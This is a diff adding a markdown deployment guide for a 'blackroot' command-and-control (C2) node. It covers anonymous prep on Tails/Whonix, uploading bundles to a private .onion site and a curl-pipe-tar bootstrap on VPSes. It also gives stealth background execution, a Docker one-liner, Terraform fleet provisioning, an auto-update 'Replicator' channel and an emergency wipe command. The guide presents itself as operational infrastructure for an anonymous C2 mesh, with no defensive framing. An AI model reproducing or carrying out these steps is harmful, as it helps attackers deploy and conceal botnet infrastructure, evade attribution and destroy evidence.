@@ -1,0 +1,74 @@
+🚢 **Zero-Identity Deployment Pipeline**  
+(works on any Linux box, VPS, or Docker host)
+
+─────────────────────────────
+1.  **One-time prep on Tails / Whonix laptop**
+```bash
+# clone & strip
+git clone --depth 1 https://github.com/you/blackroot.git
+cd blackroot
+strip blackroot_c2_api.py
+upx --best blackroot_c2_api.py      # optional
+```
+
+─────────────────────────────
+2.  **Create deployment bundle (no source)**
+```bash
+tar czf br-deploy.tar.gz \
+  blackroot_c2_api.py \
+  node.json \
+  .venv/lib/python*/site-packages/ \
+  --exclude='*.pyo' --exclude='*.pyc'
+```
+Upload to **private .onion** (or `scp` via Tor).
+
+─────────────────────────────
+3.  **VPS bootstrap (single command)**
+```bash
+# VPS shell (SSH via Tor hidden service)
+curl -fsSL https://your.onion/br-deploy.tar.gz | tar xz
+echo '{"bootstrap":["<SEED_IP>:8765"],"stealth":true}' > node.json
+nohup python3 blackroot_c2_api.py > /dev/null 2>&1 &
+```
+Exit.  Node joins mesh within 30 s.
+
+─────────────────────────────
+4.  **Docker one-liner (any host)**
+```bash
+docker run --rm -d \
+  -p 8765:8765 -p 8000:8000 \
+  -e BOOTSTRAP='["<SEED_IP>:8765"]' \
+  -e STEALTH=1 \
+  ghcr.io/you/blackroot:latest
+```
+
+─────────────────────────────
+5.  **Cloud fleet (Terraform snippet)**
+```hcl
+resource "aws_instance" "node" {
+  count         = var.count
+  ami           = "ami-0abcdef1234567890"  # Ubuntu 22.04 ARM
+  instance_type = "t3.micro"
+  user_data = base64encode(templatefile("${path.module}/bootstrap.sh",
+    { seed_ip = var.seed_ip }))
+}
+```
+`bootstrap.sh` is the same **curl | tar | node.json | nohup** above.
+
+─────────────────────────────
+6.  **Update channel (Replicator)**
+```bash
+# push new build
+tar czf br-v2.tar.gz ...
+curl -T br-v2.tar.gz https://your.onion/releases/v2.tar.gz
+# ReplicatorAgent pulls & redeploys automatically
+```
+
+─────────────────────────────
+7.  **Emergency wipe (seed VM)**
+```bash
+# on SIGTERM or manual
+wipe -rf /tmp/.blackvault && poweroff
+```
+
+Copy-paste **step 3 or 4** anywhere → node joins mesh in **< 1 min**.
